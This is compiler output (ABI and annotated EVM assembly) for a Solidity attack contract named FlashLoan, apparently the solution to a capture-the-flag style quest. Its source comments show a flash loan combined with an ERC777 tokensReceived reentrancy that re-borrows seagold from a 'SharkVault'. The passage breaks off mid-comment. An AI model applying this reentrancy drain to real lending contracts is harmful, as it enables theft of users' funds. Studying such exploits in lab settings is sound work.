{
	"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol": {
		"FlashLoan": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_flashLender",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "_gold",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "_seagold",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "_vault",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "_registry",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "initiator",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "token",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "amount",
							"type": "uint256"
						},
						{
							"internalType": "uint256",
							"name": "fee",
							"type": "uint256"
						},
						{
							"internalType": "bytes",
							"name": "",
							"type": "bytes"
						}
					],
					"name": "onFlashLoan",
					"outputs": [
						{
							"internalType": "bytes32",
							"name": "",
							"type": "bytes32"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						},
						{
							"internalType": "bytes",
							"name": "",
							"type": "bytes"
						},
						{
							"internalType": "bytes",
							"name": "",
							"type": "bytes"
						}
					],
					"name": "tokensReceived",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":3622:6705  contract FlashLoan is IERC3156FlashBorrower, IERC777TokensRecipient {... */\n  mstore(0x40, 0x80)\n    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":3918:4223  constructor(address _flashLender, address _gold, address _seagold, address _vault, address _registry) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4042:4047  _gold */\n  dup4\n    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4028:4032  gold */\n  0x00\n  dup1\n    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4028:4048  gold = IERC20(_gold) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4073:4081  _seagold */\n  dup3\n    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4056:4063  seagold */\n  0x01\n  0x00\n    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4056:4082  seagold = IERC20(_seagold) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4124:4136  _flashLender */\n  dup5\n    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4090:4101  flashLender */\n  0x02\n  0x00\n    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4090:4137  flashLender = IERC3156FlashLender(_flashLender) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4164:4170  _vault */\n  dup2\n    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4145:4150  vault */\n  0x03\n  0x00\n    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4145:4171  vault = SharkVault(_vault) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4206:4215  _registry */\n  dup1\n    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4179:4187  registry */\n  0x04\n  0x00\n    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4179:4216  registry = ERC1820Registry(_registry) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":3918:4223  constructor(address _flashLender, address _gold, address _seagold, address _vault, address _registry) {... */\n  pop\n  pop\n  pop\n  pop\n  pop\n    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":3622:6705  contract FlashLoan is IERC3156FlashBorrower, IERC777TokensRecipient {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  dup1\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1822   */\ntag_3:\n    /* \"#utility.yul\":951:957   */\n  0x00\n    /* \"#utility.yul\":959:965   */\n  dup1\n    /* \"#utility.yul\":967:973   */\n  0x00\n    /* \"#utility.yul\":975:981   */\n  dup1\n    /* \"#utility.yul\":983:989   */\n  0x00\n    /* \"#utility.yul\":1032:1035   */\n  0xa0\n    /* \"#utility.yul\":1020:1029   */\n  dup7\n    /* \"#utility.yul\":1011:1018   */\n  dup9\n    /* \"#utility.yul\":1007:1030   */\n  sub\n    /* \"#utility.yul\":1003:1036   */\n  slt\n    /* \"#utility.yul\":1000:1120   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":1039:1118   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":1000:1120   */\ntag_27:\n    /* \"#utility.yul\":1159:1160   */\n  0x00\n    /* \"#utility.yul\":1184:1248   */\n  tag_29\n    /* \"#utility.yul\":1240:1247   */\n  dup9\n    /* \"#utility.yul\":1231:1237   */\n  dup3\n    /* \"#utility.yul\":1220:1229   */\n  dup10\n    /* \"#utility.yul\":1216:1238   */\n  add\n    /* \"#utility.yul\":1184:1248   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1174:1248   */\n  swap6\n  pop\n    /* \"#utility.yul\":1130:1258   */\n  pop\n    /* \"#utility.yul\":1297:1299   */\n  0x20\n    /* \"#utility.yul\":1323:1387   */\n  tag_30\n    /* \"#utility.yul\":1379:1386   */\n  dup9\n    /* \"#utility.yul\":1370:1376   */\n  dup3\n    /* \"#utility.yul\":1359:1368   */\n  dup10\n    /* \"#utility.yul\":1355:1377   */\n  add\n    /* \"#utility.yul\":1323:1387   */\n  tag_13\n  jump\t// in\ntag_30:\n    /* \"#utility.yul\":1313:1387   */\n  swap5\n  pop\n    /* \"#utility.yul\":1268:1397   */\n  pop\n    /* \"#utility.yul\":1436:1438   */\n  0x40\n    /* \"#utility.yul\":1462:1526   */\n  tag_31\n    /* \"#utility.yul\":1518:1525   */\n  dup9\n    /* \"#utility.yul\":1509:1515   */\n  dup3\n    /* \"#utility.yul\":1498:1507   */\n  dup10\n    /* \"#utility.yul\":1494:1516   */\n  add\n    /* \"#utility.yul\":1462:1526   */\n  tag_13\n  jump\t// in\ntag_31:\n    /* \"#utility.yul\":1452:1526   */\n  swap4\n  pop\n    /* \"#utility.yul\":1407:1536   */\n  pop\n    /* \"#utility.yul\":1575:1577   */\n  0x60\n    /* \"#utility.yul\":1601:1665   */\n  tag_32\n    /* \"#utility.yul\":1657:1664   */\n  dup9\n    /* \"#utility.yul\":1648:1654   */\n  dup3\n    /* \"#utility.yul\":1637:1646   */\n  dup10\n    /* \"#utility.yul\":1633:1655   */\n  add\n    /* \"#utility.yul\":1601:1665   */\n  tag_13\n  jump\t// in\ntag_32:\n    /* \"#utility.yul\":1591:1665   */\n  swap3\n  pop\n    /* \"#utility.yul\":1546:1675   */\n  pop\n    /* \"#utility.yul\":1714:1717   */\n  0x80\n    /* \"#utility.yul\":1741:1805   */\n  tag_33\n    /* \"#utility.yul\":1797:1804   */\n  dup9\n    /* \"#utility.yul\":1788:1794   */\n  dup3\n    /* \"#utility.yul\":1777:1786   */\n  dup10\n    /* \"#utility.yul\":1773:1795   */\n  add\n    /* \"#utility.yul\":1741:1805   */\n  tag_13\n  jump\t// in\ntag_33:\n    /* \"#utility.yul\":1731:1805   */\n  swap2\n  pop\n    /* \"#utility.yul\":1685:1815   */\n  pop\n    /* \"#utility.yul\":845:1822   */\n  swap3\n  swap6\n  pop\n  swap3\n  swap6\n  swap1\n  swap4\n  pop\n  jump\t// out\n    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":3622:6705  contract FlashLoan is IERC3156FlashBorrower, IERC777TokensRecipient {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":3622:6705  contract FlashLoan is IERC3156FlashBorrower, IERC777TokensRecipient {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x23de29\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x23e30c8b\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_5\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":6278:6702  function tokensReceived(... */\n    tag_3:\n      tag_6\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_7\n      swap2\n      swap1\n      tag_8\n      jump\t// in\n    tag_7:\n      tag_9\n      jump\t// in\n    tag_6:\n      stop\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4913:6272  function onFlashLoan(... */\n    tag_4:\n      tag_10\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_11\n      swap2\n      swap1\n      tag_12\n      jump\t// in\n    tag_11:\n      tag_13\n      jump\t// in\n    tag_10:\n      mload(0x40)\n      tag_14\n      swap2\n      swap1\n      tag_15\n      jump\t// in\n    tag_14:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4477:4784  function attack() public {... */\n    tag_5:\n      tag_16\n      tag_17\n      jump\t// in\n    tag_16:\n      stop\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":6278:6702  function tokensReceived(... */\n    tag_9:\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":6430:6441  uint amount */\n      0x00\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":6444:6451  seagold */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":6444:6461  seagold.balanceOf */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x70a08231\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":6470:6475  vault */\n      0x03\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":6444:6477  seagold.balanceOf(address(vault)) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_22\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_22:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_23\n      swap2\n      swap1\n      tag_24\n      jump\t// in\n    tag_23:\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":6430:6477  uint amount = seagold.balanceOf(address(vault)) */\n      swap1\n      pop\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":6555:6556  0 */\n      0x00\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":6545:6551  amount */\n      dup2\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":6545:6556  amount == 0 */\n      sub\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":6541:6583  if (amount == 0) {... */\n      tag_25\n      jumpi\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":6568:6575  return; */\n      pop\n      jump(tag_18)\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":6541:6583  if (amount == 0) {... */\n    tag_25:\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":6672:6677  vault */\n      0x03\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":6672:6684  vault.borrow */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xc5ebeaec\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":6685:6694  750 ether */\n      0x28a857425466f80000\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":6672:6695  vault.borrow(750 ether) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_26\n      swap2\n      swap1\n      tag_27\n      jump\t// in\n    tag_26:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_28\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_28:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_30\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_30:\n      pop\n      pop\n      pop\n      pop\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":6422:6702  {... */\n      pop\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":6278:6702  function tokensReceived(... */\n    tag_18:\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4913:6272  function onFlashLoan(... */\n    tag_13:\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5076:5083  bytes32 */\n      0x00\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5159:5163  this */\n      address\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5138:5164  initiator == address(this) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5138:5147  initiator */\n      dup8\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5138:5164  initiator == address(this) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5130:5184  require(initiator == address(this), 'Wrong initiator') */\n      tag_32\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_33\n      swap1\n      tag_34\n      jump\t// in\n    tag_33:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_32:\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5217:5221  gold */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5200:5222  token == address(gold) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5200:5205  token */\n      dup7\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5200:5222  token == address(gold) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5192:5235  require(token == address(gold), 'Not gold') */\n      tag_35\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_36\n      swap1\n      tag_37\n      jump\t// in\n    tag_36:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_35:\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5258:5259  0 */\n      0x00\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5251:5254  fee */\n      dup5\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5251:5259  fee == 0 */\n      eq\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5243:5277  require(fee == 0, 'Fee must be 0') */\n      tag_38\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_39\n      swap1\n      tag_40\n      jump\t// in\n    tag_39:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_38:\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5361:5365  gold */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5361:5373  gold.approve */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x095ea7b3\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5382:5387  vault */\n      0x03\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5390:5396  amount */\n      dup8\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5361:5397  gold.approve(address(vault), amount) */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_41\n      swap3\n      swap2\n      swap1\n      tag_42\n      jump\t// in\n    tag_41:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_44\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_44:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_45\n      swap2\n      swap1\n      tag_46\n      jump\t// in\n    tag_45:\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5353:5398  require(gold.approve(address(vault), amount)) */\n      tag_47\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_47:\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5406:5411  vault */\n      0x03\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5406:5423  vault.depositGold */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x465a7007\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5424:5430  amount */\n      dup7\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5406:5431  vault.depositGold(amount) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_48\n      swap2\n      swap1\n      tag_49\n      jump\t// in\n    tag_48:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_50\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_50:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_52\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_52:\n      pop\n      pop\n      pop\n      pop\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5774:5779  vault */\n      0x03\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5774:5786  vault.borrow */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xc5ebeaec\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5787:5794  0 ether */\n      0x00\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5774:5795  vault.borrow(0 ether) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_53\n      swap2\n      swap1\n      tag_54\n      jump\t// in\n    tag_53:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_55\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_55:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_57\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_57:\n      pop\n      pop\n      pop\n      pop\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5949:5954  vault */\n      0x03\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5949:5967  vault.withdrawGold */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x9835e092\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5968:5974  amount */\n      dup7\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":5949:5975  vault.withdrawGold(amount) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_58\n      swap2\n      swap1\n      tag_49\n      jump\t// in\n    tag_58:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_59\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_59:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_61\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_61:\n      pop\n      pop\n      pop\n      pop\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":6110:6114  gold */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":6110:6122  gold.approve */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x095ea7b3\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":6131:6142  flashLender */\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* 